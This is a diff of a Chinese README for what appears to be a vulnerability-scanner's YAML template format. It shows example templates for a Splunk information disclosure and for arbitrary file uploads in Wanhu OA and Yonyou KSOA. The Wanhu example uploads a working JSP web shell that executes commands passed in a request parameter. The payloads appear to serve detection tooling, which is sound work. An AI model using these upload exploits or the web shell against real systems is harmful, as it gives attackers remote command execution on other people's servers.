@@ -45,11 +45,75 @@ optional arguments:
 
 # yaml编写方法
 
-适用版本：`0.0.1-beta`
+适用版本：`0.0.2`
+
+编写教程：
 
 ```yaml
-payload: /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
-keyword: licenseKeys
+# 单次GET
+author: W01fh4cker
+request:
+  - 
+    method: GET
+    payload: /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
+    # 自定义请求头，如果不填，则默认设置请求头只包含ua
+    headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+    keyword: licenseKeys
+    status: 200
+
+# 单次post，以<万户OA smartUpload.jsp 任意文件上传漏洞>为例
+author: W01fh4cker
+request:
+  -
+    method: POST
+    payload: /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
+    headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Cookie: JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419
+        Connection: close
+        data: "\
+            ------WebKitFormBoundary{{rboundary}}\r\n\
+            Content-Disposition: form-data; name=\"photo\"; filename=\"shell.jsp\"\r\n\
+            Content-Type: application/octet-stream\r\n\
+            \r\n\
+            <% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>\r\n\
+            ------WebKitFormBoundary{{rboundary}}\r\n\
+            Content-Disposition: form-data; name=\"continueUpload\"\r\n\
+            \r\n\
+            1\r\n\
+            ------WebKitFormBoundary{{rboundary}}\r\n\
+            Content-Disposition: form-data; name=\"submit\"\r\n\
+            \r\n\
+            上传继续\r\n\
+            ------WebKitFormBoundary{{rboundary}}--\r\n\
+          "
+        status: 200
+
+# 单次post+单次get，以<用友-时空KSOA ImageUpload 任意文件上传漏洞>为例
+author: W01fh4cker
+request:
+  -
+    method: POST
+    payload: /servlet/com.sksoft.bill.ImageUpload?filename=188888.txt&filepath=/
+    headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept: "*/*"
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    data: 123456789
+    status: 200
+  -
+    method: GET
+    payload: /pictures/188888.txt
+    headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+    keyword: 123456789
+    status: 200
 ```
 
 `payload`为需要在`url`后面拼接的内容；`keyword`为存在漏洞的`url`的界面中出现的关键字。例如：
